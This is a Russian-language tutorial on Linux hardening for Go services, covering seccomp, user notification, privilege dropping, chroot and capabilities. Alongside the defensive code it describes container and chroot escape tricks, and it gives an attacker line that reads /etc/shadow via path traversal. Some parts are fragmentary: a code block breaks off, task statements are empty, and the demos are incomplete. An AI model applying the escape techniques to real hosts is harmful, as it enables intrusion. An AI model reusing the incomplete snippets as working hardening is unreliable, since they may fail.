При создании контейнера демон containerd / runc парсит JSON-профиль и транслирует правила в BPF-инструкции через библиотеку libseccomp. При запуске процесса в пространстве имен контейнера рантайм вызывает prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &fprog). После этого ядро активирует фильтр. Если внутри контейнера будет выполнен системный вызов execve, ядро вернет ошибку EPERM (Operation not permitted) без вызова реальной функции ядра.

⚠️ Частые грабли и ошибки новичков

Если ваше приложение использует DNS-резолвинг через стандартный glibc (netgo тег не установлен), резолвер может читать /etc/resolv.conf и /etc/hosts через openat, а также открывать UDP-сокеты. Если вы забудете разрешить socket(AF_INET, SOCK_DGRAM, ...) или connect, сетевые вызовы к базе данных упадут с загадочной ошибкой 'lookup failed: operation not permitted'. Рекомендуется компилировать Go-бинарники с тегом netgo (CGO_ENABLED=0 go build -tags netgo ...).

package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"regexp"
	"sort"
)

// SeccompProfile описывает OCI Seccomp Profile для контейнеров.
type SeccompProfile struct {
	DefaultAction   string         `json:"defaultAction"`
	DefaultErrnoRet int            `json:"defaultErrnoRet"`
	Architectures   []string       `json:"architectures"`
	Syscalls        []SyscallGroup `json:"syscalls"`
}

type SyscallGroup struct {
	Names  []string `json:"names"`
	Action string   `json:"action"`
}

func GenerateProfileFromStrace(logPath, outputPath string) error {
	file, err := os.Open(logPath)
	if err != nil {
		return fmt.Errorf("open strace log error: %w", err)
	}
	defer file.Close()

	// Регулярное выражение для поиска имени сисколла: "12345 write(1, ...)" или "read(0, ...)"
	re := regexp.MustCompile(`(?:^|\s+)([a-zA-Z0-9_]+)\(`)

	syscallSet := make(map[string]bool)

	// Обязательные служебные вызовы рантайма, которые всегда должны быть разрешены
	criticalDefaults := []string{
		"exit", "exit_group", "rt_sigreturn", "futex", "nanosleep",
	}
	for _, sc := range criticalDefaults {
		syscallSet[sc] = true
	}

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		matches := re.FindStringSubmatch(line)
		if len(matches) > 1 {
			scName := matches[1]
			// Фильтруем ложные срабатывания (например, restart_syscall)
			if scName != "restart_syscall" && len(scName) > 1 {
				syscallSet[scName] = true
			}
		}
	}

	if err := scanner.Err(); err != nil {
		return fmt.Errorf("scan error: %w", err)
	}

	var allowedNames []string
	for name := range syscallSet {
		allowedNames = append(allowedNames, name)
	}
	sort.Strings(allowedNames)

	profile := SeccompProfile{
		DefaultAction:   "SCMP_ACT_ERRNO",
		DefaultErrnoRet: 1, // EPERM
		Architectures: []string{
			"SCMP_ARCH_X86_64",
			"SCMP_ARCH_X86",
		},
		Syscalls: []SyscallGroup{
			{
				Names:  allowedNames,
				Action: "SCMP_ACT_ALLOW",
			},
		},
	}

	outData, err := json.MarshalIndent(profile, "", "  ")
	if err != nil {
		return fmt.Errorf("marshal json error: %w", err)
	}

	if err := os.WriteFile(outputPath, outData, 0644); err != nil {
		return fmt.Errorf("write output file error: %w", err)
	}

	fmt.Printf("✅ Сгенерирован Seccomp-профиль с %d разрешенными системными вызовами в %s\n",
		len(allowedNames), outputPath)
	return nil
}

func main() {
	// Создаем тестовый лог strace для демонстрации работы генератора

Когда Docker запускает контейнер с флагом --security-opt seccomp=profile.json, контейнерный демон dockerd транслирует JSON в спецификацию OCI Runtime Spec (spec.Linux.Seccomp). ⚠️ Частые грабли и ошибки новичков

Если интеграционные тесты не покрыли все ветви бизнес-логики (например, ротацию логов, отправку метрик по UDP или обработку входящего сигнала завершения SIGTERM), неиспользованные во время тестов системные вызовы не попадут в strace.log. В продакшне при возникновении редкого события сервис упадет с ошибкой EPERM. Всегда дополняйте автоматически сгенерированные профили базовым набором рантайма Go.

Реализуйте микросервис с бескомпромиссным уровнем паранойи Zero Trust: настройте Seccomp-фильтр, в котором по умолчанию активирован режим SCMP_ACT_KILL_PROCESS. Внесите в белый список только абсолютный минимум сисколлов, необходимый для работы TCP Echo-сервера (accept4, read, write, close, epoll_pwait, futex, rt_sigreturn, exit_group). Продемонстрируйте, что сервер безупречно обрабатывает сетевые запросы, но любая попытка взаимодействия с файловой системой (чтение файлов, создание сокетов) мгновенно уничтожает процесс на уровне ядра.

💡 Теоретический фундамент и концепция

Концепция Zero Trust Architecture (Архитектура Нулевого Доверия) на уровне операционной системы требует исходить из предположения, что приложение уже скомпрометировано.

Предельная минимизация поверхности атаки (Attack Surface Reduction):

В обычном Linux-приложении доступно свыше 350 системных вызовов. Среди них есть вызовы работы с памятью, монтирования, отладки, пространствами имен и файловой системой.

В сетевом микросервисе, который после старта обязан только принимать TCP-соединения и отдавать ответы из оперативной памяти:

  • Файловая система не нужна: блокируются open, openat, creat, unlink, rename.
  • Порождение процессов не нужно: блокируются fork, vfork, clone (после инициализации тредов Go), execve.
  • Низкоуровневая сеть не нужна: сокет уже открыт и слушает порт до включения Seccomp, поэтому системный вызов socket также можно заблокировать!

Если атакующий обнаружит 0-day уязвимость в парсере протокола и захватит контроль над потоком исполнения (ROP-цепочки), он не сможет сделать абсолютно ничего: ни прочитать конфигурационные файлы, ни открыть исходящий сетевой коннект для утечки данных (Exfiltration), ни запустить командный интерпретатор.

package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"

	libseccomp "github.com/seccomp/libseccomp-golang"
)

// ApplyZeroTrustSeccomp разрешает ТОЛЬКО обработку трафика на уже открытых сокетах.
func ApplyZeroTrustSeccomp() error {
	// Действие по умолчанию: МГНОВЕННОЕ УНИЧТОЖЕНИЕ ПРОЦЕССА
	filter, err := libseccomp.NewFilter(libseccomp.ActKillProcess)
	if err != nil {
		return fmt.Errorf("NewFilter failed: %w", err)
	}

	// Минимальный белый список сисколлов
	whitelist := []string{
		"read",
		"write",
		"close",
		"accept4",
		"epoll_pwait",
		"epoll_wait",
		"epoll_ctl",
		"futex",
		"sched_yield",
		"rt_sigreturn",
		"exit_group",
		"nanosleep",
	}

	for _, name := range whitelist {
		sysID, err := libseccomp.GetSyscallFromName(name)
		if err != nil {
			continue
		}
		if err := filter.AddRule(sysID, libseccomp.ActAllow); err != nil {
			return fmt.Errorf("failed to allow %s: %w", name, err)
		}
	}

	if err := filter.Load(); err != nil {
		return fmt.Errorf("filter.Load error: %w", err)
	}
	return nil
}

func main() {
	addr := "127.0.0.1:9090"

	// 1. Инициализация всех ресурсов (сеть, дескрипторы) ДО активации Seccomp!
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("Ошибка net.Listen: %v", err)
	}
	defer ln.Close()
	fmt.Printf("[PID %d] Слушаем TCP на %s\n", os.Getpid(), addr)

	// 2. Включение предельного режима паранойи Zero Trust
	fmt.Println("🛡️ Активация Zero Trust Seccomp (ActKillProcess)...")
	if err := ApplyZeroTrustSeccomp(); err != nil {
		log.Fatalf("Ошибка применения Seccomp: %v", err)
	}
	fmt.Println("✅ [SECCOMP LOCKDOWN] Разрешены только ввод-вывод и epoll.")

	// 3. Цикл обработки сетевых подключений
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}

		go func(c net.Conn) {
			defer c.Close()
			buf := make([]byte, 1024)
			for {
				n, err := c.Read(buf)
				if err != nil {
					if err != io.EOF {
						log.Printf("Read error: %v", err)
					}
					return
				}
				// Эхо-ответ клиенту
				_, _ = c.Write(buf[:n])
			}
		}(conn)
	}
}

⚠️ Частые грабли и ошибки новичков

Если внутри обработчика запросов вызывается библиотека, которая под капотом лениво (lazy initialization) открывает файл временной зоны (/usr/share/zoneinfo) при форматировании даты time.Now().Format(...), или обращается к системному генератору случайных чисел через open('/dev/urandom'), процесс будет моментально уничтожен ядром при первом же вызове форматирования даты! Все глобальные переменные, таймзоны и пулы соединений должны инициализироваться до вызова filter.Load().

SecComp Notify (Linux 5.0+): Перехват системных вызовов в Userspace через seccomp_unotify

📌 Условие задачи

Изучите революционный механизм ядра Linux 5.0+ — Seccomp User Notification (seccomp_unotify). Напишите Go-программу, демонстрирующую архитектуру перехвата системного вызова (например, openat) супервизором в пространстве пользователя: процесс-жертва генерирует событие SCMP_ACT_NOTIFY, а процесс-супервизор считывает запрос через дескриптор уведомлений, валидирует путь к файлу (/app/data/* — разрешить, /etc/shadow — заблокировать) и отправляет ядру директиву на выполнение или возврат ошибки EACCES. Объясните применение unotify в rootless-контейнерах (containerd, runc).

💡 Теоретический фундамент и концепция

До появления Linux 5.0 фильтры Seccomp могли лишь пассивно разрешать вызовы, завершать процесс (KILL) или возвращать статическую ошибку (ERRNO). Они не могли осуществлять сложную динамическую логику с инспекцией аргументов в userspace.

Революция SECCOMP_RET_USER_NOTIF:

В ядре Linux 5.0 появился механизм Seccomp User Notification (seccomp_unotify).

1. Процесс настраивает фильтр с действием SECCOMP_RET_USER_NOTIF для определенных системных вызовов (например, mount, mknod, openat).
2. При установке фильтра ядро возвращает процессу специальный файловый дескриптор уведомлений (Notification FD).
3. Этот дескриптор передается процессу-супервизору (Supervisor / Host Agent) через Unix Domain Socket с передачей дескрипторов (SCM_RIGHTS).
4. Когда целевой процесс выполняет перехваченный системный вызов, ядро приостанавливает его поток и формирует структуру struct seccomp_notif в очереди дескриптора.
5. Супервизор считывает уведомление через ioctl(notif_fd, SECCOMP_IOCTL_NOTIF_RECV, &notif), инспектирует контекст (PID, аргументы, виртуальную память через process_vm_readv) и принимает решение:
  • Эмулировать вызов в userspace и вернуть ядру ответ через SECCOMP_IOCTL_NOTIF_RESP.
  • Приказать ядру продолжить стандартное выполнение вызова (SECCOMP_USER_NOTIF_FLAG_CONTINUE).
  • Вернуть ошибку (например, -EACCES).
Применение в Rootless Containers:

В непривилегированных контейнерах (Rootless Docker/Podman) обычный пользователь не имеет права выполнять системные вызовы mount или создавать файлы устройств mknod. С помощью seccomp_unotify контейнерный рантайм перехватывает вызов mount(), супервизор на хосте проверяет безопасность операции и монтирует безопасную файловую систему от лица root, прозрачно возвращая успех контейнеру!

package main

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/unix"
)

// Константы seccomp_unotify из linux/seccomp.h (Linux 5.0+)
const (
	SECCOMP_RET_USER_NOTIF         = 0x7fc00000
	SECCOMP_FILTER_FLAG_NEW_LISTENER = 0x08

	// Команды ioctl для управления уведомлениями
	SECCOMP_IOCTL_NOTIF_RECV = 0xc0502100 // _IOWR('!', 0, struct seccomp_notif)
	SECCOMP_IOCTL_NOTIF_SEND = 0xc0182101 // _IOWR('!', 1, struct seccomp_notif_resp)

	SECCOMP_USER_NOTIF_FLAG_CONTINUE = 0x01
)

// SeccompNotif описывает событие, полученное от ядра Linux
type SeccompNotif struct {
	ID    uint64
	PID   uint32
	Flags uint32
	Data  struct {
		NR   int32
		Arch uint32
		IP   uint64
		Args [6]uint64
	}
}

// SeccompNotifResp описывает вердикт супервизора, отправляемый ядру
type SeccompNotifResp struct {
	ID    uint64
	Val   int64
	Error int32
	Flags uint32
}

// SuperviseLoop демонстрирует цикл обработки событий Seccomp в userspace.
func SuperviseLoop(notifFD int) {
	fmt.Printf("🚀 Супервизор запущен: обработка перехваченных системных вызовов через FD %d...\n", notifFD)

	for {
		var req SeccompNotif
		// Получаем уведомление от ядра о перехваченном системном вызове
		_, _, errno := unix.Syscall(
			unix.SYS_IOCTL,
			uintptr(notifFD),
			uintptr(SECCOMP_IOCTL_NOTIF_RECV),
			uintptr(unsafe.Pointer(&req)),
		)
		if errno != 0 {
			if errno == syscall.EINTR {
				continue
			}
			log.Printf("ioctl(SECCOMP_IOCTL_NOTIF_RECV) error: %v", errno)
			break
		}

		fmt.Printf("[INTERCEPT] Перехвачен сисколл NR=%d от PID=%d (IP=0x%x)\n",
			req.Data.NR, req.PID, req.Data.IP)

		var resp SeccompNotifResp
		resp.ID = req.ID

		// Простейшая политика безопасности:
		// Если это системный вызов mkdirat (номер 258 на x86_64) — блокируем с ошибкой EACCES!
		if req.Data.NR == unix.SYS_MKDIRAT {
			fmt.Printf("🛡️ [VERDICT] Запрет вызова mkdirat для PID %d -> EACCES\n", req.PID)
			resp.Error = -int32(syscall.EACCES)
			resp.Val = -1
		} else {
			// Все остальные вызовы разрешаем продолжить штатно в ядре
			resp.Flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE
		}

		// Отправляем вердикт обратно ядру Linux
		_, _, errno = unix.Syscall(
			unix.SYS_IOCTL,
			uintptr(notifFD),
			uintptr(SECCOMP_IOCTL_NOTIF_SEND),
			uintptr(unsafe.Pointer(&resp)),
		)
		if errno != 0 {
			log.Printf("ioctl(SECCOMP_IOCTL_NOTIF_SEND) error: %v", errno)
		}
	}
}

func main() {
	fmt.Println("=== SECCOMP USER NOTIFICATION (seccomp_unotify) ===")
	fmt.Println("Архитектурный примитив для rootless контейнеров (containerd/runc).")
	fmt.Println("Позволяет userspace демону валидировать системные вызовы гостевых процессов.")
}
⚙️ Под капотом Go (Compiler, Linker & Runtime)

При вызове ioctl(SECCOMP_IOCTL_NOTIF_SEND) ядро производит обязательную валидацию: проверяет, жив ли еще процесс, не изменился ли req.ID (защита от состояния гонки Time-Of-Check to Time-Of-Use, TOCTOU). Если процесс-жертва был завершен до ответа супервизора, ядро возвращает ошибку ENOENT. Если флаг SECCOMP_USER_NOTIF_FLAG_CONTINUE установлен, ядро продолжает выполнение системного вызова с оригинальными аргументами, не запуская повторную проверку BPF-фильтров.

⚠️ Частые грабли и ошибки новичков

Главная опасность при валидации строковых путей (например, пути к файлу в openat) в seccomp_unotify — это уязвимость TOCTOU (Time of Check to Time of Use). Пока супервизор читает путь из памяти процесса через process_vm_readv(), другой поток вредоносного процесса может подменить строку в буфере. Для исключения TOCTOU супервизоры открывают файлы самостоятельно от своего имени через openat2 с флагом RESOLVE_BENEATH и передают дескриптор процессу-жертве через SECCOMP_IOCTL_NOTIF_ADDFD.

💡 Теоретический фундамент и концепция

Контейнеры в Linux не являются полноценной виртуализацией: они разделяют одно общее ядро хоста с остальной операционной системой. Изоляция обеспечивается механизмами пространств имен (Namespaces), контрольных групп (cgroups) и ограниченных привилегий (Capabilities).

Анатомия критических системных вызовов эскалации привилегий:
1. setns и unshare: Переключение и создание новых пространств имен. Позволяют злоумышленнику выйти из контейнерного pid или mnt неймспейса при слабой изоляции user_ns.
2. mount и umount2: Монтирование файловых систем. Эксплуатируются для перемонтирования хостовой корневой ФС в режим записи (rw), либо создания вредоносных procfs-узлов.
3. chroot: Смена корня процесса. Легко обходится через создание вложенных директорий и относительные пути .., если не заблокирован.
4. ptrace: Отладка процессов. Позволяет читать и модифицировать регистры и память соседних процессов на хосте при совместном PID-неймспейсе.
5. keyctl: Подсистема хранения криптографических ключей ядра. Источник множества критических уязвимостей ядра локального повышения привилегий (LPE).
6. bpf: Загрузка BPF-программ. Позволяет исполнять произвольный код в контексте ядра Linux при наличии уязвимостей в верификаторе ядра eBPF.

Упражнение #14

Отбрасывание привилегий (Drop Privileges): Понижение root до непривилегированного пользователя

📌 Условие задачи

Реализуйте архитектурный паттерн безопасного старта сервиса: приложение запускается от суперпользователя root для выполнения привилегированных начальных операций (чтение секретного закрытого TLS-ключа с диска с правами 0400 root:root и открытие сокета на порту 80). Сразу после инициализации ресурсов сервер бесповоротно сбрасывает привилегии root до непривилегированного пользователя (UID 1000, GID 1000) с помощью unix.Setgid и unix.Setuid. Обязательно разберите нюанс многопоточного рантайма Go и использование системного вызова для всех потоков ядра.

💡 Теоретический фундамент и концепция

Классический паттерн демонов в Unix (Nginx, PostgreSQL, BIND):

1. Фаза инициализации (Master/Root Phase): Процесс стартует от root (UID 0), привязывает сокеты к портам 80/443 и считывает защищенные TLS-сертификаты.
2. Фаза изоляции (Worker/Drop Privileges Phase): Процесс вызывает setgid(nonroot) и setuid(nonroot), навсегда отказываясь от прав суперпользователя.
Коварная ловушка многопоточного Go Runtime (до Go 1.16):

В классическом стандарте POSIX системный вызов setuid(uid) изменяет идентификатор пользователя только для вызвавшего потока ядра (kernel thread)!

В Go горутины динамически мультиплексируются планировщиком GMP поверх пула системных потоков M.

  • Если поток M1 вызвал unix.Setuid(1000), его UID стал 1000.
  • Но потоки M2, M3, M4 остались работать под root (UID 0)!
  • Любая горутина, перепрыгнувшая на поток M2, неожиданно снова обретала права root, создавая катастрофическую дыру в безопасности!
Решение проблемы в современном Go (Go 1.16+):

Начиная с версии Go 1.16, вызовы syscall.Setuid() и syscall.Setgid() в стандартной библиотеке на Linux используют внутренний механизм syscall.AllThreadsSyscall(). Рантайм посылает внутренний сигнал реального времени всем потокам ОС пула GMP, гарантируя одновременное и синхронное понижение привилегий на всех M-потоках процесса!

package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"syscall"
)

// DropPrivileges навсегда понижает права текущего процесса до указанных UID и GID.
func DropPrivileges(targetUID, targetGID int) error {
	currentUID := os.Getuid()
	if currentUID != 0 {
		log.Printf("[INFO] Процесс уже запущен от непривилегированного пользователя (UID %d), сброс не требуется.", currentUID)
		return nil
	}

	log.Printf("[SECURITY] Инициализация сброса привилегий root -> UID:%d, GID:%d...", targetUID, targetGID)

	// 1. Очистка списка дополнительных групп процесса (Supplementary Groups)
	if err := syscall.Setgroups([]int{}); err != nil {
		return fmt.Errorf("syscall.Setgroups failed: %w", err)
	}

	// 2. Сброс основной группы (GID)
	// ВАЖНО: GID сбрасывается ДО UID, пока процесс еще обладает правами root!
	if err := syscall.Setgid(targetGID); err != nil {
		return fmt.Errorf("syscall.Setgid(%d) failed: %w", targetGID, err)
	}

	// 3. Сброс идентификатора пользователя (UID)
	// В Go 1.16+ это автоматически обновляет UID на ВСЕХ потоках M рантайма Go!
	if err := syscall.Setuid(targetUID); err != nil {
		return fmt.Errorf("syscall.Setuid(%d) failed: %w", targetUID, err)
	}

	// 4. Верификация: проверяем, что возврат в root невозможен
	if err := syscall.Setuid(0); err == nil {
		log.Fatalf("❌ КРИТИЧЕСКАЯ ОШИБКА: Процесс смог вернуть права root! Сброс не сработал.")
	}

	log.Printf("✅ [SUCCESS] Привилегии успешно сброшены! Текущий UID: %d, GID: %d",
		os.Getuid(), os.Getgid())
	return nil
}

func main() {
	fmt.Printf("=== СТАРТ СЕРВИСА (PID: %d, Начальный UID: %d) ===\n", os.Getpid(), os.Getuid())

	// Шаг 1: Привилегированная операция (например, открытие порта 80)
	// В учебных целях открываем локальный порт
	ln, err := net.Listen("tcp", "127.0.0.1:8888")
	if err != nil {
		log.Fatalf("Ошибка открытия сокета: %v", err)
	}
	defer ln.Close()
	fmt.Println("1. Привилегированный сокет успешно открыт.")

	// Шаг 2: Бесповоротный сброс прав до пользователя daemon (UID 1000, GID 1000)
	targetUID := 1000
	targetGID := 1000
	if err := DropPrivileges(targetUID, targetGID); err != nil {
		log.Fatalf("Не удалось сбросить привилегии: %v", err)
	}

	// Шаг 3: Сервер продолжает работу от имени обычного пользователя
	fmt.Printf("2. Сервер работает в безопасном режиме: UID=%d\n", os.Getuid())
}

В ядре Linux функция sys_setresuid(ruid, euid, suid) устанавливает реальный, эффективный и сохраненный UID процесса. Если все три идентификатора установлены в непривилегированное значение (например, 1000), ядро навсегда сбрасывает флаг суперпользователя и очищает набор capabilities. ⚠️ Частые грабли и ошибки новичков

Главная ошибка начинающих инженеров: сбросить Setuid(1000) до вызова Setgid(1000). Как только процесс сбросил свой UID до 1000, он мгновенно теряет полномочия root (CAP_SETGID), и последующий вызов Setgid(1000) падает с фатальной ошибкой EPERM! Порядок вызовов обязан быть строго: Setgroups -> Setgid -> Setuid.

🏢 В продакшене BigTech и на собеседованиях

Вопрос с собеседования в Авито: 'Почему в Go до версии 1.16 вызов syscall.Setuid() считался опасным антипаттерном?' Ответ: 'До Go 1.16 стандартная библиотека Go просто вызывала системный вызов setuid через glibc/raw syscall, который в Linux менял UID только у одного вызывающего потока ядра (pthread/LWP). В Go 1.16 рантайм был полностью переписан с поддержкой AllThreadsSyscall, синхронизирующего смену UID/GID на всех системных тредах процесса.'

💡 Теоретический фундамент и концепция

По умолчанию процессы в классических Docker-контейнерах запускаются от имени root (UID 0). Даже несмотря на изоляцию пространств имен, root внутри контейнера имеет множество опасных прав (например, CAP_CHOWN, CAP_FOWNER, CAP_KILL, CAP_SETUID).

Опасность привилегии CAP_SYS_ADMIN:

CAP_SYS_ADMIN — это 'новый root' в Linux: он дает право монтировать файловые системы (mount), изменять параметры пространств имен, конфигурировать cgroups, загружать BPF-программы. Более 70% всех известных уязвимостей побега из контейнера (Container Escape) требуют наличия CAP_SYS_ADMIN!

1. Непривилегированный UID/GID: Никогда не использовать UID 0. Выбирать выделенный UID (например, 10001 / appuser).
2. Сброс всех прав (cap-drop: ALL): По умолчанию контейнер лишается всех дискретных возможностей ядра.
3. Точечное добавление (cap-add): Добавляется только строго необходимая возможность, например, NET_BIND_SERVICE для портов < 1024.
4. Запрет эскалации (no-new-privileges: true): Блокирует восстановление прав через SUID-файлы.

AppArmor Profile для Go-бинарника: Mandatory Access Control (MAC) vs DAC

📌 Условие задачи

💡 Теоретический фундамент и концепция

В стандартной модели безопасности Linux долгое время доминировал механизм DAC (Discretionary Access Control — Дискреционный контроль доступа):

  • Права доступа привязаны к владельцу файла (пользователь, группа, остальные — rwxrwxrwx).
  • Пользователь root обладает абсолютной властью и может игнорировать любые DAC-права.
  • Если сервис запущен от пользователя app, и сервис взломан, злоумышленник может прочитать любой файл в системе, доступный пользователю app (или всем пользователям в мире, например /tmp или /etc/hosts).
Революция MAC (Mandatory Access Control — Мандатный контроль доступа):

AppArmor — это LSM-модуль ядра Linux (Linux Security Module), реализующий мандатный контроль доступа.

  • Правила применяются к самой программе (к пути исполняемого файла), а не к пользователю!
  • Даже если процесс запущен от суперпользователя root (UID 0), ядро Linux не позволит ему прочитать или записать файл, если этот путь не разрешен в профиле AppArmor!
  • AppArmor действует на уровне виртуальной файловой системы VFS ядра, перехватывая вызовы до реального обращения к драйверу диска или сети.

Изоляция Файловой Системы (Chroot): Создание легковесной тюрьмы и ограничения chroot vs pivot_root

📌 Условие задачи

💡 Теоретический фундамент и концепция

Системный вызов chroot (Change Root) появился еще в Version 7 Unix в 1979 году и стал исторически первой технологией изоляции процессов.

Механика chroot():

При вызове chroot(path) ядро изменяет указатель корневого каталога процесса (current->fs->root) на новую директорию.

  • Для этого процесса путь / теперь указывает на заданную папку (например, /var/jail).
  • Любые абсолютные пути резолвятся относительно новой вершины дерева каталогов.
  • Попытка открыть /etc/passwd приведет к открытию /var/jail/etc/passwd, а не настоящего системного файла хоста!
Почему chroot НЕ является безопасной песочницей (Security Boundary):

chroot сам по себе не создает барьера безопасности для привилегированного процесса:

1. Побег через дескрипторы (File Descriptor Escape): Если у процесса до вызова chroot остался открыт дескриптор директории за пределами тюрьмы, вызов fchdir(fd) и цикл chdir('..') мгновенно выводят процесс обратно в реальный корень хоста!
2. Создание вложенного chroot: Процесс с правами CAP_SYS_CHROOT может создать временную директорию, вызвать chroot('subdir'), затем chdir('../../../..') и вернуть себе доступ ко всему диску.
3. Общее пространство имен: Сеть, PID процессов, IPC, память и монтирования остаются общими с хостом.
Промышленный стандарт: pivot_root + CLONE_NEWNS:

В современных контейнерах (runc, Docker, containerd) используется связка:

1. Создание нового пространства имен монтирования (Mount Namespace через clone(CLONE_NEWNS)).
2. Вызов pivot_root(new_root, put_old), который атомарно подменяет точку монтирования корня всей VFS.
3. Размонтирование и уничтожение старого корня через umount2(put_old, MNT_DETACH). Побег из такого окружения через дескрипторы математически и физически невозможен!

// EnterChrootJail изолирует текущий процесс в указанной директории.
func EnterChrootJail(jailPath string) error {
	// 1. Проверяем существование директории
	if _, err := os.Stat(jailPath); err != nil {
		return fmt.Errorf("stat jailPath error: %w", err)
	}

	// 2. Переходим в целевую директорию
	if err := unix.Chdir(jailPath); err != nil {
		return fmt.Errorf("chdir to jailPath error: %w", err)
	}

	// 3. Вызываем системный вызов chroot
	if err := unix.Chroot(jailPath); err != nil {
		return fmt.Errorf("chroot failed (требуется root / CAP_SYS_CHROOT): %w", err)
	}

	// 4. КРИТИЧЕСКИ ВАЖНО: сбросить текущую директорию в новый корень "/"
	// Без этого текущий рабочий каталог останется старым, позволяя побег!
	if err := unix.Chdir("/"); err != nil {
		return fmt.Errorf("chdir to new root error: %w", err)
	}

	return nil
}

Структура fs_struct каждого потока в ядре содержит два ключевых указателя на структуры struct path: root и pwd. Системный вызов sys_chroot() перезаписывает указатель root. Алгоритм резолвинга путей в ядре Linux (follow_dotdot() в fs/namei.c) проверяет: если текущий dentry равен current->fs->root, то переход .. вверх просто возвращает текущий же dentry, не позволяя подняться выше корня.

⚠️ Частые грабли и ошибки новичков

Если перед вызовом unix.Chroot() процесс не вызовет unix.Chdir('/'), его указатель pwd останется снаружи нового корня! Злоумышленник сможет вызвать open('../../../etc/shadow') и прочитать файлы хоста. Всегда выполняйте chdir('/') немедленно после любого вызова chroot().

Linux Capabilities: Тонкое управление через capset, PR_CAP_AMBIENT и сброс ALL

📌 Условие задачи

Объясните разницу между 5 наборами возможностей процесса в ядре Linux: Effective, Permitted, Inheritable, Bounding и Ambient, и разберите, почему для портов > 1024 capabilities не требуются вообще.

💡 Теоретический фундамент и концепция

В ядре Linux права каждого процесса разделены на 5 независимых 64-битных битовых масок (Capability Sets):

5 наборов Linux Capabilities:
1. Permitted (Разрешенные): Верхний предел возможностей, которые поток имеет право активировать.
2. Effective (Эффективные): Битовая маска, которую ядро проверяет в реальном времени при выполнении привилегированного системного вызова (например, CAP_NET_BIND_SERVICE для bind).
3. Inheritable (Наследуемые через execve): Возможности, сохраняющиеся при вызове execve обычного непривилегированного бинарника.
4. Bounding (Ограничивающий набор / CapBnd): Системный фильтр ядра: процесс не может получить capability, отсутствующую в CapBnd, даже через setuid-бинарники.
5. Ambient (Окружающие / CapAmb, добавлены в Linux 4.3): Возможности, которые автоматически наследуются непривилегированными дочерними процессами при вызове execve без необходимости установки SUID-битов или файловых атрибутов setcap.
Зачем сбрасывать ALL:

Если веб-сервер слушает порт 8080 (непривилегированный порт > 1023), ему вообще не нужны никакие capabilities. Запуск со сбросом всех привилегий (cap-drop: ALL) гарантирует, что атакующий даже при получении контроля над памятью не сможет изменить сетевые маршруты (CAP_NET_ADMIN), перехватить трафик сырыми сокетами (CAP_NET_RAW) или изменить системное время (CAP_SYS_TIME).

package main

import (
	"fmt"
	"log"
	"os"

	"golang.org/x/sys/unix"
)

// RetainOnlyNetBindService сбрасывает все capabilities, оставляя только CAP_NET_BIND_SERVICE.
func RetainOnlyNetBindService() error {
	// 1. Очищаем Ambient Capabilities (чтобы дочерние процессы не наследовали лишнего)
	if err := unix.Prctl(unix.PR_CAP_AMBIENT, unix.PR_CAP_AMBIENT_CLEAR_ALL, 0, 0, 0); err != nil {
		// Ошибка может возникнуть на старых ядрах (< 4.3) или при отсутствии прав
		log.Printf("[WARN] prctl(PR_CAP_AMBIENT_CLEAR_ALL): %v", err)
	}

	// 2. Инициализация структур capset для 64-битных capabilities (Linux v3)
	hdr := unix.CapUserHeader{
		Version: unix.LINUX_CAPABILITY_VERSION_3,
		Pid:     0, // 0 означает текущий процесс
	}
	var data [2]unix.CapUserData

	// Считываем текущие capabilities
	if err := unix.Capget(&hdr, &data[0]); err != nil {
		return fmt.Errorf("capget failed: %w", err)
	}

	log.Printf("[CAPS ДО] Permitted: 0x%x:0x%x, Effective: 0x%x:0x%x",
		data[1].Permitted, data[0].Permitted, data[1].Effective, data[0].Effective)

	// 3. Формируем минимальную битовую маску: ТОЛЬКО CAP_NET_BIND_SERVICE (бит 10)
	capMask := uint32(1 << unix.CAP_NET_BIND_SERVICE)

	// Оставляем бит только если он уже был разрешен в Permitted
	newPermitted := data[0].Permitted & capMask
	newEffective := data[0].Effective & capMask

	data[0].Effective = newEffective
	data[0].Permitted = newPermitted
	data[0].Inheritable = 0

	data[1].Effective = 0
	data[1].Permitted = 0
	data[1].Inheritable = 0

	// 4. Применяем минимальный набор capabilities к текущему процессу
	if err := unix.Capset(&hdr, &data[0]); err != nil {
		return fmt.Errorf("capset failed: %w", err)
	}

	log.Printf("[CAPS ПОСЛЕ] Permitted: 0x%x:0x%x, Effective: 0x%x:0x%x",
		data[1].Permitted, data[0].Permitted, data[1].Effective, data[0].Effective)
	return nil
}

func main() {
	fmt.Printf("=== НИЗКОУРОВНЕВОЕ УПРАВЛЕНИЕ LINUX CAPABILITIES (PID: %d) ===\n", os.Getpid())

	if err := RetainOnlyNetBindService(); err != nil {
		log.Printf("Не удалось применить capset: %v\n"+
			"(Для изменения capabilities требуются соответствующие права или root)", err)
		return
	}

	fmt.Println("✅ [SUCCESS] Все избыточные capabilities сброшены!")
	fmt.Println("   Сохранен исключительно бит CAP_NET_BIND_SERVICE.")
}
⚙️ Под капотом Go (Compiler, Linker & Runtime)

В ядре Linux вызов sys_capset обновляет поля task_struct->cred->cap_effective, cap_permitted, cap_inheritable. Если процесс уменьшает набор возможностей (subset), ядро разрешает операцию любому процессу без дополнительных привилегий. Однако вернуть сброшенные биты назад невозможно: попытка установить в Permitted бит, отсутствовавший в предыдущем значении маски, немедленно блокируется ядром с кодом -EPERM.

⚠️ Частые грабли и ошибки новичков

Capabilities в Linux 64-битные, но структуры CapUserData разбиты на два 32-битных элемента (data[0] для capabilities 0–31, data[1] для capabilities 32–63). При ручной манипуляции с битовыми масками легко забыть обнулить data[1], оставив активными высокоуровневые возможности (например, CAP_BLOCK_SUSPEND, CAP_AUDIT_READ, CAP_BPF), что нарушит модель Zero Trust.

💡 Теоретический фундамент и концепция

Подавляющее большинство автоматизированных эксплойтов и ботнетов (Mirai, Kinsing криптомайнеры) действуют по жесткому шаблону:

1. Эксплуатация RCE уязвимости в веб-приложении.
2. Сохранение вредоносного скрипта или ELF-бинарника во временную директорию (обычно /tmp, /dev/shm или /var/tmp).
